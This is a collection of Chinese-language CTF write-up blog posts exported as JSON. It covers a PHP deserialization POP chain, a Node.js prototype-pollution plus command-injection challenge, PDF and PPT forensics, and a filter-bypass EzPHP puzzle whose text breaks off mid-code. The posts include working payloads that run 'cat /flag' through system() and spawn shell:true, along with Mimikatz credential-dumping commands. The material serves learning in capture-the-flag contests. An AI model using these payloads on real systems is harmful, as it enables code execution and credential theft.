[{"title":"[2020_新春红包题]1","url":"/2025/05/26/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-1/","content":"[2020_新春红包题]1根据题目提示传入参数src&#x3D;1，成功拿到源码\n&lt;?phperror_reporting(0);class A &#123;    protected $store;    protected $key;    protected $expire;    public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123;        $this-&gt;key = $key;        $this-&gt;store = $store;        $this-&gt;expire = $expire;    &#125;    public function cleanContents(array $contents) &#123;        $cachedProperties = array_flip([            &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;,            &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;,        ]);        foreach ($contents as $path =&gt; $object) &#123;            if (is_array($object)) &#123;                $contents[$path] = array_intersect_key($object, $cachedProperties);            &#125;        &#125;        return $contents;    &#125;    public function getForStorage() &#123;        $cleaned = $this-&gt;cleanContents($this-&gt;cache);        return json_encode([$cleaned, $this-&gt;complete]);    &#125;    public function save() &#123;        $contents = $this-&gt;getForStorage();        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);    &#125;    public function __destruct() &#123;        if (!$this-&gt;autosave) &#123;            $this-&gt;save();        &#125;    &#125;&#125;class B &#123;    protected function getExpireTime($expire): int &#123;        return (int) $expire;    &#125;    public function getCacheKey(string $name): string &#123;        // 使缓存文件名随机        $cache_filename = $this-&gt;options[&#x27;prefix&#x27;] . uniqid() . $name;        if(substr($cache_filename, -strlen(&#x27;.php&#x27;)) === &#x27;.php&#x27;) &#123;          die(&#x27;?&#x27;);        &#125;        return $cache_filename;    &#125;    protected function serialize($data): string &#123;        if (is_numeric($data)) &#123;            return (string) $data;        &#125;        $serialize = $this-&gt;options[&#x27;serialize&#x27;];        return $serialize($data);    &#125;    public function set($name, $value, $expire = null): bool&#123;        $this-&gt;writeTimes++;        if (is_null($expire)) &#123;            $expire = $this-&gt;options[&#x27;expire&#x27;];        &#125;        $expire = $this-&gt;getExpireTime($expire);        $filename = $this-&gt;getCacheKey($name);        $dir = dirname($filename);        if (!is_dir($dir)) &#123;            try &#123;                mkdir($dir, 0755, true);            &#125; catch (\\Exception $e) &#123;                // 创建失败            &#125;        &#125;        $data = $this-&gt;serialize($value);        if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;        $result = file_put_contents($filename, $data);        if ($result) &#123;            return $filename;        &#125;        return null;    &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123;    highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123;    mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]);\n\n\n\n看见类就知道是php反序列化了，100多行的代码，这是要审计死我啊。别的不说，看来半天没结果，直接看题解\n看完题解后发现有两个解，两个解在我看来难度都达到了预期解的标准，但是只能有一个，但实际上这个题目可不止两种写法\n我们先进行简单的代码审计，发现有两个突破口。\n第一个是B类中serialize方法\nprotected function serialize($data): string &#123;        if (is_numeric($data)) &#123;            return (string) $data;        &#125;        $serialize = $this-&gt;options[&#x27;serialize&#x27;];        return $serialize($data);//这个代码将$setialize作为函数名，可以进行命令执行    &#125;\n\n\n\n第二个是B类中的set方法\n$data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;        $result = file_put_contents($filename, $data);//在加上死亡exit()后进行文件写入，我们之前遇到过，可以使用php://filter进行绕过\n\n\n\n但是这两个方法怎么触发是个问题，还是得再进行审计\n首先触发的是A类的construct方法，但是好像没什么用\npublic function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123;        $this-&gt;key = $key;        $this-&gt;store = $store;        $this-&gt;expire = $expire;    &#125;//对这些进行赋值，虽然construct方法规定$key，但是我们还是可以自己改\n\n然后就是destruct方法\npublic function __destruct() &#123;        if (!$this-&gt;autosave) &#123;            $this-&gt;save();        &#125;    &#125;//如果不存在autosave这个属性，就会调用save()方法\n\nsave方法中成功调用了B类中的set方法\npublic function save() &#123;        $contents = $this-&gt;getForStorage();        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);//我们只需要将store属性赋值为B类即可，我们还可以决定参数    &#125;\n\nset方法\n    public function set($name, $value, $expire = null): bool&#123;        $this-&gt;writeTimes++;        if (is_null($expire)) &#123;            $expire = $this-&gt;options[&#x27;expire&#x27;];//首先判断$expire，如果为空并对其进行赋值，但实际在传入参数的时候赋值为null了，肯定是要被赋值的        &#125;        $expire = $this-&gt;getExpireTime($expire);        $filename = $this-&gt;getCacheKey($name);//通过我们传入的参数对属性进行赋值        $dir = dirname($filename);//使用dirname获取$filename返回的目录        if (!is_dir($dir)) &#123;            try &#123;                mkdir($dir, 0755, true);            &#125; catch (\\Exception $e) &#123;                // 创建失败            &#125;        &#125;//如果不存在这个路径就创建        $data = $this-&gt;serialize($value);//重点来了，这里调用了setialize，使用$value作为参数        if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;        //这个代码对我们的数据实现了一个拼接，那个sptint可以不用管用于记录缓存的过期时间，然后再在后面添加死亡exit        $result = file_put_contents($filename, $data);        if ($result) &#123;            return $filename;        &#125;        return null;    &#125;&#125;\n\n我们看完set方法之后发现serialize方法也在set方法之中调用了，我们可以根据不同的突破口进行pop链的构造了\n方法一命令执行\n我们通过B类中的setialize方法进行函数执行，我们直接使用system进行命令执行就行了\n    protected function serialize($data): string &#123;        if (is_numeric($data)) &#123;            return (string) $data;//如果我们传入的参数是数字字符串则返回字符串类型的data，这里是不是有逻辑漏洞，应该要加一个!        &#125;        $serialize = $this-&gt;options[&#x27;serialize&#x27;];//B类中虽然没有直接定义，但是在php类中直接调用这个属性会自动创建        return $serialize($data);//进行代码执行//system([&#123;&quot;path&quot;:&quot;a&quot;,&quot;dirname&quot;:&quot;`cat \\/flag &gt; .\\/uploads\\/flag.php`&quot;&#125;,true]);    &#125;\n\n根据这个对我们参数data的，过滤逻辑错误，导致我们可以直接控制参数进行命令执行\n我们首先要关注的是参数value，源于A类中参数content\n$contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);//getForStorage()public function getForStorage() &#123;        $cleaned = $this-&gt;cleanContents($this-&gt;cache);        return json_encode([$cleaned, $this-&gt;complete]);//对我们拿到的两个参数进行json加密    &#125;//cleanContents()public function cleanContents(array $contents) &#123;        $cachedProperties = array_flip([            &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;,            &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;,        ]);        foreach ($contents as $path =&gt; $object) &#123;//如果contents数组中的值为数组则进行过滤，这里我感觉实际上是存在逻辑漏洞的，应该是对contents这个数组进行白名单过滤，因为返回的是contents这个数组作为命令执行的参数            if (is_array($object)) &#123;                $contents[$path] = array_intersect_key($object, $cachedProperties);//对其进行过滤，只能保留上面数组中出现过的键，实际上没用，我们随便用键名            &#125;        &#125;        return $contents;    &#125;\n\n\n\npop链\n&lt;?phpclass A&#123;    protected $store;    protected $key;    protected $expire;    public $cache = [];    public $complete = true;    public function __construct () &#123;        $this-&gt;store = new B();        $this-&gt;key = &#x27;/../wtz.phtml&#x27;;        $this-&gt;cache = [&#x27;path&#x27;=&gt;&#x27;a&#x27;,&#x27;dirname&#x27;=&gt;&#x27;`cat /flag &gt; ./uploads/flag.php`&#x27;];    &#125;&#125;class B&#123;    public $options = [        &#x27;serialize&#x27; =&gt; &#x27;system&#x27;,        &#x27;prefix&#x27; =&gt; &#x27;sssss&#x27;,    ];&#125;echo urlencode(serialize(new A()));\n\n我们已经分析完代码了，现在根据payload来补充一些细节\nreturn json_encode([$cleaned, $this-&gt;complete]);//这个代码中会对我们的参数进行一个json加密，结果为//[&#123;&quot;path&quot;:&quot;a&quot;,&quot;dirname&quot;:&quot;`cat \\/flag &gt; .\\/uploads\\/flag.php`&quot;&#125;,true]//如果以这个形式无论放到system还是命令执行都是要报错的\n\n但是我之前一直都没搞明白system这些命令执行函数，system(&#39;cat /falg&#39;);实际上就是把引号中cat /flag放到Shell中去执行然后返回结果，于是我们的代码system(‘[{“path”:”a”,”dirname”:”`cat /flag &gt; ./uploads/flag.php`“},true]’);实际上就是在命令行中执行[{“path”:”a”,”dirname”:”`cat /flag &gt; ./uploads/flag.php`“},true]\n我之前一直都以为只有在php中存在反引号执行命令，但实际上是Linux系统中也存在反引号用于命令执行(这是bash的语法)，\n于是当我们在Shell中输入的是\n[&#123;&quot;path&quot;:&quot;a&quot;,&quot;dirname&quot;:&quot;`cat \\/flag &gt; .\\/uploads\\/flag.php`&quot;&#125;,true]\n\n在 Linux 系统中，当 PHP 的 system(&#39;cat /flag&#39;); 执行时，实际传递给 Shell 的是不带引号的 cat /flag\n于是就会变成了\n[&#123;&quot;path&quot;:&quot;a&quot;,&quot;dirname&quot;:&quot;`cat \\/flag &gt; .\\/uploads\\/flag.php`&quot;&#125;,true]\n\n然后经过实践测试，在反引号中代码会被执行\n\n\n代码中要用双引号也是有原因的，双引号中的内容会进行变量解析，从而执行命令，否则\n\n\n由于在Linux的Shell中反引号为命令执行符，会优先执行这个命令，进行cat /flag再定向到flag.php中\n按照之前的逻辑漏洞，我们即使把数组键名改了也没问题，直接开改\n&lt;?phpclass A&#123;    protected $store;    protected $key;    protected $expire;    public $cache = [];    public $complete = true;    public function __construct () &#123;        $this-&gt;store = new B();        $this-&gt;key = &#x27;/../wtz.phtml&#x27;;//这个key在我这种解法没用只要不包含php，不触发die就行了        $this-&gt;cache = [&#x27;a&#x27;=&gt;&#x27;`cat /flag &gt; ./uploads/flag.php`&#x27;];    &#125;&#125;class B&#123;    public $options = [        &#x27;serialize&#x27; =&gt; &#x27;system&#x27;,        &#x27;prefix&#x27; =&gt; &#x27;sssss&#x27;,    ];&#125;echo urlencode(serialize(new A()));\n\n实践证明，的确存在逻辑漏洞\n\n"},{"title":"2025湖南省省赛复盘","url":"/2025/10/13/2025%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%9B%98/","content":"2025湖南省省赛复盘省赛在昨天就结束了，成绩还没出来，但大抵是寄了。这次省赛和平时的CTF题目有一些不同，同时也和去年的省赛规则不同，加了AWD的题目和CTF组合的形式。\n这次最主要也感觉最好拿分的就是防御，但是我根本没防住，代码虽然挺简单的，但是不知道为什么我们一开始提交补丁的时候那个cp命令路径是错误的，最后几分钟的时候把附件中cp命令路径前面的斜杠给删除了，同样的代码，就因为删除了一个./就防御成功了，也是挺魔幻的。\n然后就是只有Misc的附件可以写下题解了\nPDF省赛都这么无聊了吗，这个比去年的PPT含金量还低一点，要是没想到就纯折磨人。\n这里也是总结一下遇到这些简单的题目更是要思维灵活一点，不要往那些几乎不可能的方向去尝试，不然这题目肯定写不出来\nflag分为三个部分，我们需要从附件的PDF文件中使用不同的方式找到三个flag\n第一部分直接提取\n我们之前做杂项的时候，遇到word肯定是立刻检查白色字符，看下是不是藏了flag，但其实PDF的字是无法被选中的，但是我们可以通过Ctrl+a实现全选\n\n\n我们可以看到计算后面明显有一部分，我们直接复制粘贴到记事本中即可发现第一个flag\n\n\ndart&#123;pdf_ste\n\n\n\n第二部分查看文件内容\n我们直接使用010editor打开PDF文件，根据第一个flag的提示前面会有一个first，于是我们直接搜索second\n\n\n成功拿到\nganography_1s\n\n\n\n第三部分formost提取\n对这个PDF文件使用formost提取，会多得到一个PDF文件，打开拿到最后的flag\n\n\n\n\n\n\n然后将三部分拼接起来\ndart&#123;pdf_steganography_1s_1nTerest1ng&#125;\n\n\n\n\n\nwebshell我复习了那么久的流量包比赛的时候还是寄了，为什么要这么对我。\n题目提示我们这个流量包是一个通过文件上传上传木马的流量包，然后需要我们找出上传木马的ip和端口\n我先对流量包进行了分析，发现传输数据中会出现我无法解码的数据，看起来像Base64\n\n\n结合题目分析，这个是webshell流量，使用工具进行解析（虽然我不知道是哪种webshell，但是全部都试一遍发现是冰蝎的流量）\n进行解析会发现，虽然我们可以看到命令和很多代码，但是这些都和题目没有关系，因为我们的目的是要找到上传了木马（不是webshell）的ip，就因为把webshell误认为了木马，导致我纠结了好久\n一开始我们发现有一个10.211.55.102的IP一直在对192.168.1.117进行攻击，于是就可以判断10.211.55.102就是ip，但是在流量包中的端口一直在变换，导致我们无法确定端口，然后再仔细分析一下冰蝎流量发现一个特殊并且很大的请求包\n\n\n发现3719中有一个请求参数content，翻译过来就是内容，我们对这个进行两次base64解码发现是一个文件（比赛的时候就是因为没有认出这个elf文件导致这里就没多去看了，当时以为需要在那些cmd命令中去找到线索，要是尝试点一下那个保存键搞不好结果就不一样了）\n\n\nelf文件是Linux的可执行文件，通过上传这个文件可以不依赖web服务实现持续性后门，于是这个就是我们需要找的木马，我们将其保存至虚拟机中，然后再运行，运行之后发现没有直接输出ip和端口\n\n\n鉴于是后门，这里又学会一个命令用来查看进程\nnetstat -pantu\n\n这是四个选项的组合：\n\n-p : 显示进程信息\n-a : 显示所有连接\n-n : 以数字形式显示\n-t : 显示TCP连接\n-u : 显示UDP连接\n\n发现elf开启了一个进程，这个就是攻击者的ip\n\n\n10.211.52.1000:1337\n\n\n\n\n\n\n\n总结这次比赛也是认识到了很多不足的地方，一个就是比赛经验太少了，在线下断网的情况下就能力大减，比赛前也没有做好充足的准备，比赛时的心态出现了问题，无法做到一直冷静的思考，到后面就有一点摆烂了。\n当然，最大的不足还是能力不行，如果遇到过做过的知识点，心态是很难出问题的\n还有就是比如webshell这个题目，虽然之前没怎么见过，但是比赛的时候如果能够保持心态的话是可以猜出flag的，比赛时遇到没见过的知识点的做题能力也是十分重要的，虽然大概率写不出来就是了\n不能因为这次比赛没考一些比如Java，Python反序列化和代码审计等知识点就不去学习，只能说这次比赛难度不大，但是还是没有做到知识面广，接下来就需要准备国赛了，希望国赛能够进线下赛吧\n还有就是下次省赛能不能管饭，难道就因为比赛方被规定不能收取参赛方的钱就让我8个小时只吃一个面包，看来下次得自己准备一些零食来补充能量了\n"},{"title":"2024湖南省省赛复现","url":"/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"2024湖南省省赛复现真的不妙啊，马上就要去打省赛了，但是怎么一开始就考原型链污染啊，后面也是java，搞不好要省赛爆零啊，杂项也不知道写不写的出\nweb[入口靶机]pingline附件下载下来有100多mb，看了一下是一个js的框架，但实际上和题目有关的就只有一个路由文件而已\n&quot;use server&quot;;import &#123; spawn &#125; from &quot;node:child_process&quot;;/* * Reinventing the wheel and make it square * Because JSON.parse is not available in the server environment (really?) */  //这里提示这个文件写了一个函数用于解析json数据function jsonParse(  str: string,  ret?: Record&lt;string, any&gt;//两个参数ret参数可以不提供则为空对象 Record&lt;string, any&gt;是ts的对象): Record&lt;string, any&gt; &#123;//指定返回一个对象  ret ??= &#123;&#125;;//如果ret是null或undefined，则赋值为空对象&#123;&#125;  if (!(str.startsWith(&quot;&#123;&quot;) &amp;&amp; str.endsWith(&quot;&#125;&quot;))) &#123;    return ret;  &#125;  const matches = str    .slice(1, str.length - 1)    .matchAll(      /(?:^|,)\\s*&quot;(?&lt;key&gt;\\w+)&quot;\\s*:\\s*(?&lt;value&gt;\\d+|(?:true|false)|&quot;(?:\\\\.|[^&quot;])*&quot;|\\&#123;.+?&#125;)/g    );//这个正则在题目中不需要看，听ai说这是一个用来匹配键值对的正则//这个是在str字符串调用slice方法去掉前后的&#123;&#125;然后调用matchAll方法将键值对转换为数组  for (const match of matches) &#123;    const &#123; key, value &#125; = match.groups!;    if (value.startsWith(&#x27;&quot;&#x27;)) &#123;      ret[key] = value//这里是重点，将一个对象的键值赋值一个值 key和value我们都可以控制        .slice(1, value.length - 1)        .replace(/\\\\(u([0-9a-fA-F]&#123;4&#125;)|.)/g, (_, m: string, code: string) =&gt;          m === &quot;u&quot;//这个正则在题目中也不要看，是用来还原一些不可见字符            ? String.fromCharCode(parseInt(code, 16))            : (&#123; b: &quot;\\b&quot;, f: &quot;\\f&quot;, n: &quot;\\n&quot;, r: &quot;\\r&quot;, t: &quot;\\t&quot; &#125;[m] ?? m)        );    &#125; else if (value.startsWith(&quot;&#123;&quot;)) &#123;//如果json值中又嵌套了一个json数据      if (!(key in ret)) ret[key] = &#123;&#125;;      jsonParse(value, ret[key]);//重点在这，原型链污染的特征，就是取一个数组的值作为参数进行函数嵌套 我们可以控制key为__proto__则访问到了Object    &#125; else &#123;      ret[key] = &#123; true: true, false: false &#125;[value] ?? +value;    &#125;  &#125;  return ret;&#125;export async function pingAction(data: string, count: number = 4) &#123;  const body: &#123; ip?: string &#125; = jsonParse(data);//调用jsonParse  const proc = spawn(&quot;ping&quot;, [`-c$&#123;count&#125;`, body.ip!, &quot;-W1&quot;], &#123;    stdio: [&quot;inherit&quot;, &quot;pipe&quot;, &quot;pipe&quot;],    env: &#123; ...process.env, LC_ALL: &quot;C.UTF-8&quot; &#125;,  &#125;);//这里是命令执行，也是这个题目的重点  let output = &quot;&quot;;  proc.stdout.on(&quot;data&quot;, (data) =&gt; (output += data));  proc.stderr.on(&quot;data&quot;, (data) =&gt; (output += data));  await new Promise((resolve) =&gt; proc.on(&quot;close&quot;, resolve));  return output;&#125;//&#123;&quot;ip&quot;: &quot;127.0.0.1;cat /flag;ping -c4 127.0.0.1&quot;, &quot;__proto__&quot;: &#123;&quot;shell&quot;: true&#125;&#125;\n\n我们找到server文件夹下的ping.ts文件，题目是pingline，于是推测这是一个命令拼接的题目\n看完了这个题目的代码，终于看明白是如何进行命令执行和原型链污染了，但是不愧是省赛的题目，我都不知道该原型链污染哪里，尝试了直接在127.0.0.1后面拼接命令，但是肯定是不行的，今年可千万别上来就是原型链污染啊\n然后去看了一下题解才知道，问题出在spawn上面了，我们先来了解一下spawn\n基本语法\nconst child = spawn(command: string, args?: string[], options?: Object)\n\n\ncommand: 要执行的命令（例如 ls, git, find）。\nargs: 传递给命令的参数数组。这是将命令参数化的安全方式。\noptions: 一个可选的配置对象（常用选项见下文）。\n\n重点在于options这个属性，spawn默认是通过参数传递字符串而不是拼接，就导致我们无法直接命令拼接执行，但是在spawn中有一个shell配置，默认为false，如果为true则是通过shell去执行命令，是进行命令拼接而不是作为参数传递，所以我们想要进行命令拼接就需要先将shell配置为true\n常见的配置方法\n//直接配置const &#123; spawn &#125; = require(&#x27;child_process&#x27;);const proc = spawn(&quot;ping&quot;, [&quot;-c4&quot;, &quot;127.0.0.1&quot;], &#123;    stdio: [&quot;inherit&quot;, &quot;pipe&quot;, &quot;pipe&quot;],    shell: true, // 直接在这里设置    env: &#123; ...process.env, LC_ALL: &quot;C.UTF-8&quot; &#125;,&#125;);//通过环境变量配置// 通过原型链污染环境变量Object.prototype.shell = true;// 或者process.env.__proto__.shell = true;// 当执行以下代码时：const proc = spawn(&quot;ping&quot;, [&quot;-c4&quot;, &quot;127.0.0.1&quot;], &#123;    stdio: [&quot;inherit&quot;, &quot;pipe&quot;, &quot;pipe&quot;],    env: &#123; ...process.env, LC_ALL: &quot;C.UTF-8&quot; &#125;, // 这里会展开 process.env&#125;);//不是布尔值而是shell路径也可以const proc = spawn(&quot;ping&quot;, [&quot;-c4&quot;, &quot;127.0.0.1&quot;], &#123;    stdio: [&quot;inherit&quot;, &quot;pipe&quot;, &quot;pipe&quot;],    shell: &#x27;/bin/bash&#x27;, // 指定 shell 路径    env: &#123; ...process.env, LC_ALL: &quot;C.UTF-8&quot; &#125;,&#125;);\n\n我们可以看到第二种方法就是配置的时候的这个代码\nenv: &#123; ...process.env, LC_ALL: &quot;C.UTF-8&quot; &#125;//spawn中的env配置项用于决定子进程的环境变量//...process.env  ...是展开操作符 用于展开环境变量process.env  展开后我们可以改变环境变量//LC_ALL: &quot;C.UTF-8&quot;  覆盖或者新增环境变量\n\n 重点在于展开操作会沿着原型链查找可枚举属性！\n// 污染 Object.prototypeObject.prototype.shell = true;Object.prototype.evil = &#x27;hacked&#x27;;// process.env 的正常环境变量process.env.PATH = &#x27;/usr/bin&#x27;;process.env.HOME = &#x27;/home/user&#x27;;// 使用展开操作符const newEnv = &#123; ...process.env &#125;;console.log(newEnv);// 输出可能包含：// &#123;//   PATH: &#x27;/usr/bin&#x27;,//   HOME: &#x27;/home/user&#x27;,//   shell: true,       // 来自原型链！//   evil: &#x27;hacked&#x27;     // 来自原型链！// &#125;\n\n...obj 实际上等价于：\nconst result = &#123;&#125;;for (const key in obj) &#123;  if (obj.hasOwnProperty(key)) &#123;    // 但注意：实际上展开操作符不会做 hasOwnProperty 检查！    result[key] = obj[key];  &#125;&#125;\n\n也就是说我们只要原型链污染了，展开操作符就会沿着原型链找到所有属性，我们就可以通过原型链污染实现环境变量注入从而实现改变spawn配置\n于是我们的思路有了，首先原型链污染很容易，就和普通的原型链污染一样，直接通过__proto__属性污染Object中写入shell:true，然后再进行命令执行即可\n我们进入靶场，抓个包发现格式为\n[&quot;&#123;\\&quot;ip\\&quot;:\\&quot;127.0.0.1\\&quot;&#125;&quot;]\n\n于是我们再写一个数据进行原型链污染\n[&quot;&#123;\\&quot;ip\\&quot;:\\&quot;127.0.0.1;whoami\\&quot;,\\&quot;__proto__\\&quot;:&#123;\\&quot;shell\\&quot;:true&#125;&#125;&quot;]\n\n发送后发现虽然和直接拼接命令不同，没有报错但是命令也没有执行\n\n\n根据提示是命令执行whoami后面添加了一个未知的-w1配置，代码中的确拼接了\nconst proc = spawn(&quot;ping&quot;, [`-c$&#123;count&#125;`, body.ip!, &quot;-W1&quot;], &#123;  stdio: [&quot;inherit&quot;, &quot;pipe&quot;, &quot;pipe&quot;],  env: &#123; ...process.env, LC_ALL: &quot;C.UTF-8&quot; &#125;,&#125;);\n\n这个应该是ping命令独有的配置，我们只需要在后面添加一个ping命令即可\n[&quot;&#123;\\&quot;ip\\&quot;:\\&quot;127.0.0.1;cat /flag;ping 127.0.0.1\\&quot;,\\&quot;__proto__\\&quot;:&#123;\\&quot;shell\\&quot;:true&#125;&#125;&quot;]\n\n成功拿到flag\n\n\n\n\nMiscPPT附件下载下来是一个PPT文件，当无法直接用PPT打开的时候我就该感觉到不对劲，而不是去修复。\n用010editor打开发现是PK开头，那就是zip文件了，但是我又在题解中找到了一个用来分离文件的工具DIE，这次用DIE试一下\n\n\n通过这个提取器去提取文件\n\n\n效果不错，感觉比某binwalk要好用多了，我们解压压缩包后又找到了一个特殊文件\n\n\n到过来念的是高手，尝试用010editor打开，拉到最后发现有个\n\n\n好像是将16进制全部到过来了，自己不会写脚本，只能抄大佬的\nimport structdef reverse_binary_file(file_path):    # 读取原始二进制文件    with open(file_path, &#x27;rb&#x27;) as file:        content = bytearray(file.read())    # 反转字节序列    reversed_content = content[::-1]    # 写入新的反转后的文件    new_file_path = f&quot;&#123;file_path&#125;_reversed&quot;    with open(new_file_path, &#x27;wb&#x27;) as new_file:        new_file.write(reversed_content)    print(f&quot;原始文件已成功反转并保存为 &#123;new_file_path&#125;&quot;)reverse_binary_file(&quot;手高是的念来过倒&quot;)\n\n也不是代码看不懂，而是很少写代码了，都不知道线下赛该怎么办啊。\n然后将后缀改为zip，解压发现需要密码，再次在010中查看发现末尾有提示\nweakpassword\n\n醒着的密码，看题解说提示我们密码可以爆破出来，尝试爆破，密码为2233\n解压发现是一个dmp文件，百度了一下发现是Windows的蓝屏文件，看了题解突然想起来之前做题遇到的一个Mimikatz工具，利用这个工具可以解析dmp文件然后推断出Windows用户名和密码等信息\n先载入dmp文件\nsekurlsa::minidump lsass.dmp\n\n然后再获取用户名和密码\nsekurlsa::logonpasswords full\n\n最后拿到\n\n\n虽然我不知道这是如何做到的，也不知道输出的是什么，但是只要看到flag就行了\n","tags":["js原型链污染","电子取证"]},{"title":"[ACTF新生赛2020]frequency","url":"/2025/10/19/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-frequency/","content":"[ACTF新生赛2020]frequency闹麻了，又被新生赛吊打了，本来很简单的一个题目，竟然因为我不知道怎么从WPS中复制隐藏字符而寄掉了\n 新生赛的杂项题基本上都可以从名字中找到线索，frequency中文频率，看来这个题目可能和字频统计有关\n下载下来是一个Word文档，发现一大串隐藏字符猜测是Base64编码，而且提示我们flag有两部分\n\n\n然后我在查看属性的时候在备注中发现了下半的编码，可以确定就是Base64编码\n\n\n然后现在就出现问题了，我不知道为什么没办法复制隐藏字符，之前也是，只不过之前太短了都是直接抄下来的\n看了wp才知道，直接右键选择字体，然后把这个隐藏属性给取消就可以复制了\n\n\n然后把我们得到的两部分进行拼接然后Base64解码\n\n\n然后进行字频统计得到flag\n\n\nflag\nactf&#123;plokmijnuhbygvrdxeszwq&#125;\n\n","tags":["隐藏字符","Misc"]},{"title":"[BJDCTF2020]EzPHP","url":"/2025/04/20/BJDCTF2020-EzPHP/","content":"[BJDCTF2020]EzPHP我们直接查看页面源代码，拿到一串编码\nGFXEIM3YFZYGQ4A=\n\n我们先用base64解码失败，发现没有小写字母，猜测是base32编码，我们解码拿到题目1nD3x.php\n我们访问拿到\n &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123;     if (        preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])        )          die(&#x27;You seem to want to do something bad?&#x27;); &#125;if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))              die(&#x27;fxck you! I hate English!&#x27;);     &#125; &#125; if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#x27;&#x27;, $arg); &#125; ?&gt; \n\n妈的，这辈子我都没看见这么多过滤，太难了，我们只能一层一层的看\n第一层\nif($_SERVER) &#123;     if (        preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])        )          die(&#x27;You seem to want to do something bad?&#x27;); &#125;\n\n这个对我们请求的所有数据进行了一个过滤，如果我们就正常的去绕过肯定不行，因为他过滤掉了变量名\n不知道的东西就是没思路，看了题解就好多了。$_SERVER[&#39;QUERY_STRING&#39;]只会获取请求的原始数据，不会对数据进行url解码，我们只需要对我们传入数据的变量名和值进行url编码就可以全部绕过\n第二层\nif (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) 